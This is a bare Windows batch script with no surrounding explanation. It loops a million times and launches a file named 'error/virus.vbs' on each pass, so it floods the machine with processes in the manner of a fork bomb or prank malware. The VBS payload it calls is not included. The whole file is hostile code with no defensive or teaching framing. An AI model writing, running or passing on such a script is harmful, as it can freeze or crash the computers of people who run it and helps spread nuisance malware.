set cont=1000000
:window 
start error/virus.vbs 
if %cont% equ 0 goto windowend
set /a cont=cont-1 
goto window
:windowend
